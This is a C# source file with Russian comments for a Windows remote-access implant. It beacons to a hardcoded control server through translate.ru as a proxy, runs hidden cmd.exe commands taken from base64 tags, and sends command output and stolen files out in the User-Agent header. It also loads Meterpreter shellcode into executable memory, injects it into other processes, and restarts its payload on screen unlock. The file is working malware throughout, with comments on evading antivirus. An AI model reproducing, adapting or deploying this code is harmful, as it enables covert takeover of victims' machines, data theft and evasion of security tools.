/*

Из под Linux с установленным monodevelop компилировать:
mcs Program.cs

В Windows для компиляции в 32-битное прилодение:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe Program.cs -platform:x86

*/

using System;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;


using System.Reflection;

using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace MyApp
{
    
	public static class Globals
	{
		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
		[DllImport("kernel32")]
		private static extern UInt32 VirtualFree(UInt32 lpStartAddr, UInt32 size, UInt32 flFreeType);
		[DllImport("kernel32")]
		private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		[DllImport("kernel32")]
		private static extern UInt32 TerminateThread(IntPtr hHandle, UInt32 dwExitCode);
		[DllImport("kernel32")]
		public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Int32 bInheiritHandle, UInt32 dwProcessId);
		[DllImport("kernel32")]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
		[DllImport("kernel32.dll")]
		public static extern Int32 WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [In] byte[] lpBuffer, UInt32 nSize, Int32 lpNumberOfBytesRead);			
		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out UInt32 lpThreadId);
	
		public static string shellCode = "";
		public static IntPtr hThread = IntPtr.Zero; // Modifiable
		//public const Int32 BUFFER_SIZE = 512; // Unmodifiable
		//public static readonly String CODE_PREFIX = "US-"; // Unmodifiable
		public static UInt32 addrInj;
	
		public static void startMeterpreter (string payload) {
				
				// Обрабатываем возможность вызова meterpreter с пустой строкой
				bool cont = true;
				if (payload == "") {
					if (shellCode == "") {
						addrInj = 0;
						cont = false;
					}
					else payload = shellCode;
				}

				if (cont) {
					string[] Xpayload = payload.Split(',');
					byte[] X_Final = new byte[Xpayload.Length];
					for (int i = 0; i < Xpayload.Length; i++) {
						X_Final[i] = Convert.ToByte(Xpayload[i], 16);
					}
					
					UInt32 MEM_COMMIT = 0x1000;
					UInt32 PAGE_EXECUTE_READWRITE = 0x40;
					//Console.ForegroundColor = ConsoleColor.Gray;
					//Console.WriteLine("Bingo Meterpreter session by Hardcoded Payload with strings ;)");
					UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
					
					// Присвоим адрес для последующей очистки
					addrInj = funcAddr;
					
					Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);
					//IntPtr hThread = IntPtr.Zero;
					UInt32 threadId = 0x0000;
					IntPtr pinfo = IntPtr.Zero;
					hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
					WaitForSingleObject(hThread, 0xffffffff);
				}
				
			}
		
		public static void stopMeterpreter() {
			// Убиваем поток и освобождаем память
			TerminateThread(hThread, 0);
			if (addrInj != 0)
				VirtualFree(addrInj, 0, 0x8000);
		}
		
		public static void injectProcess(string payload, UInt32 process_id) {
			// Функция для инъекции кода в память чудого процесса. Касперский блокирует инъекции, использовать при его отсутствии/отключении
			// Обрабатываем возможность вызова meterpreter с пустой строкой
			bool cont = true;
			if (payload == "") {
				if (shellCode == "") {
					addrInj = 0;
					cont = false;
				}
				else payload = shellCode;
			}
			if (cont) {
				string[] Xpayload = payload.Split(',');
				byte[] X_Final = new byte[Xpayload.Length];
				for (int i = 0; i < Xpayload.Length; i++) {
					X_Final[i] = Convert.ToByte(Xpayload[i], 16);
				}
			
				IntPtr process_handle = OpenProcess(0x1F0FFF, 0x0000, process_id);
				IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (UInt32)X_Final.Length, 0x00001000, 0x40);
				WriteProcessMemory(process_handle, memory_allocation_variable, X_Final, (UInt32)X_Final.Length, 0x0000);
				UInt32 dwThreadId;
				CreateRemoteThread(process_handle, IntPtr.Zero, 0x0000, memory_allocation_variable, IntPtr.Zero, 0x0000, out dwThreadId);
			}
			
		}
		
		public static string readFileB64(string path){
			Byte[] bytes = File.ReadAllBytes(path);
			return Convert.ToBase64String(bytes);
		}
	}
	
	static class StringExtensions {

	  public static IEnumerable<String> SplitInParts(this String s, Int32 partLength) {
		if (s == null)
		  throw new ArgumentNullException("s");
		if (partLength <= 0)
		  throw new ArgumentException("Part length has to be positive.", "partLength");

		for (var i = 0; i < s.Length; i += partLength)
		  yield return s.Substring(i, Math.Min(partLength, s.Length - i));
	  }

	}
	
	class Program {
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		
		
		static string hostAddr = "video.cft-sd.xyz";
		static string hostPort = "5000";
		// Воспользуемся translate.ru как прокси, учитывая что страница должна быть не больше 512 КБ
		public static string url = "https://www.translate.ru/SiteResult.aspx?dirCode=ar&templateId=auto&url=http%3a%2f%2f"+hostAddr+"%3a"+hostPort+"%2f?key=";
		public static string user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36";
		public static string key = "";
		public static string pcName = Environment.MachineName;
		public static string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
		
		// Выполнение действий после события блокировки/разблокировки экрана
		static void SystemEvents_SessionSwitch(object sender, SessionSwitchEventArgs e) {
			if (e.Reason == SessionSwitchReason.SessionLock) { 
				Globals.stopMeterpreter();
			}
			else if (e.Reason == SessionSwitchReason.SessionUnlock) {
				//Thread tid1 = tid1 = new Thread(new ThreadStart(Globals.startMeterpreter));
				Thread tid1 = new Thread(() => Globals.startMeterpreter(Globals.shellCode));
				// Если с момента запуска не удалось получить код, пробуем еще раз
				if (Globals.shellCode == "")
					runWeb();
				tid1.IsBackground = true;
				tid1.Start();
			}
		}
		
		static void Main(string[] args) {
			SystemEvents.SessionSwitch += new SessionSwitchEventHandler(SystemEvents_SessionSwitch);
			// Генерируем уникальный для запущенной программы ключ
			key = Guid.NewGuid().ToString();
			
			// Скрываем окно консоли
			//const int SW_HIDE = 0;
			//const int SW_SHOW = 5;
			//var handle = GetConsoleWindow();
			// Hide
			//ShowWindow(handle, SW_HIDE);
			//Thread.Sleep(1000);
			// Show
			//ShowWindow(handle, SW_SHOW);
			
			//runShellCode();
			
			runWeb();
			//Console.WriteLine(getPID("Outlook"));
			//getPIDList();
			//Globals.injectProcess(Globals.shellCode, 14784);
			while (true) Thread.Sleep(1000);
		}
		
		private static string parseData(string data64){
			// Функция парсит текст, извлекает и запускает команду, оставленную на странице в base64 между тегами <cmd123></cmd123> и передает на исполнение
			string data = "";
			if (data64.IndexOf("<cmd123>") >= 0) {
				int start_index = data64.IndexOf("<cmd123>");
				int end_index = data64.IndexOf("</cmd123>");
				string base64 = data64.Substring(start_index + 8, end_index - start_index - 8);
				base64 = base64.Replace(" ", "");
				data = System.Text.UTF8Encoding.UTF8.GetString(Convert.FromBase64String(base64));
			}
			return data;
		}
		
		private static string execCommand(string command) {
			// Парсим и смотрим наличие команды на загрузку кода в память
			string []cmd = Regex.Split(command, " ");
			string ret;
			if (cmd[0].ToLower().Equals("load")) {
				Globals.shellCode = cmd[1];
				new Thread(() => {
					Thread.CurrentThread.IsBackground = true; 
					// Запускаем в потоке код
					Globals.startMeterpreter(cmd[1]);
				}).Start();
				ret = "Injected";
			}
			else if (cmd[0].ToLower().Equals("read")) {
				ret = Globals.readFileB64(cmd[1]);
			}
			
			
			
			else {
				
				// Выполняем команду
				System.Diagnostics.Process process = new System.Diagnostics.Process();
				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = "/c \"" + command + "\"";
				startInfo.RedirectStandardOutput = true;
				startInfo.RedirectStandardError = true;
				startInfo.UseShellExecute = false;
				process.StartInfo = startInfo;
				process.Start();
				string rez = process.StandardOutput.ReadToEnd();
				string err = process.StandardError.ReadToEnd();
				process.WaitForExit();
				ret = rez + err;
			}
			if (ret.Length != 0)
				ret = "\r\n\r\n" + ret + "\r\nCommand Complete!!!\r\n";
			return ret;
		}
		/*
		public static string GetLocalIPAddress()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		*/
		private static void runWeb() {
			
			// Первым запросом зарегистрируем клиента на сервере. После каждого запроса будем проверять есть ли клиент в наборе и при отсутствии добавим его.
			string URI = url + key + "%26id="+domainName+"\\"+pcName;
			
			while (true) {
				
				HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(URI);
					
				((WebRequest)request).Proxy = System.Net.WebRequest.DefaultWebProxy;
				((WebRequest)request).Proxy.Credentials = CredentialCache.DefaultCredentials;

				request.UserAgent = user_agent;

				string responseText = "";
				try {
					using (HttpWebResponse response = (HttpWebResponse)request.GetResponse()) {
						using (var reader = new StreamReader(response.GetResponseStream())) {
							responseText = reader.ReadToEnd();
						}
						response.Close();
					}	
				}
				catch {
					Thread.Sleep(1000);
				}
				
				string data = "";
				
				if (responseText != "")
					data = parseData(responseText);
				
				
				string []result = execCommand(data).SplitInParts(2000).ToArray();
				
				sendHttpData(result);
				
			}
		}
		
		
		private static int getPID(string procName){
			Process[] processlist = Process.GetProcesses();
			foreach (Process theprocess in processlist) {
				if (theprocess.ProcessName.ToLower().Equals(procName.ToLower()))
					return theprocess.Id;
			}
			return 0;
		}
		
		private static void sendHttpData(string []data) {
			foreach (string str in data) {
				string str64 = Convert.ToBase64String(System.Text.UTF8Encoding.UTF8.GetBytes(str));
				
				// Create a request for the URL. 
				HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url + key);
				// If required by the server, set the proxy credentials.
				((WebRequest)request).Proxy = System.Net.WebRequest.DefaultWebProxy;
				((WebRequest)request).Proxy.Credentials = CredentialCache.DefaultCredentials;
				// Set User-Agent with data.
				request.UserAgent = user_agent + '|' + str64;
				// Send data
				string responseText = "";
				try {
					using (HttpWebResponse response = (HttpWebResponse)request.GetResponse()) {
						using (var reader = new StreamReader(response.GetResponseStream())) {
							responseText = reader.ReadToEnd();
						}
						response.Close();
					}	
				}
				catch {
					Thread.Sleep(1000);
				}
			
			}
			
			
			
		}
		
		private static void getPIDList(){
			Process[] processlist = Process.GetProcesses();
			foreach (Process theprocess in processlist)
				// Получение пути для 64-битных приложений возможно при компиляции под 64-битную архитектуру, иначе получим исключение
				try {
					// Если приложение 32-битное, сможем получить путь
					Console.WriteLine("Process: {0} ID: {1} Path: \"{2}\"", theprocess.ProcessName, theprocess.Id, theprocess.MainModule.FileName);
				}
				catch{
					// Если выпало исключение, значит приложение 64-битное и выводим без пути
					Console.WriteLine("Process: {0} ID: {1}", theprocess.ProcessName, theprocess.Id);
				}
				
		}
    }
}
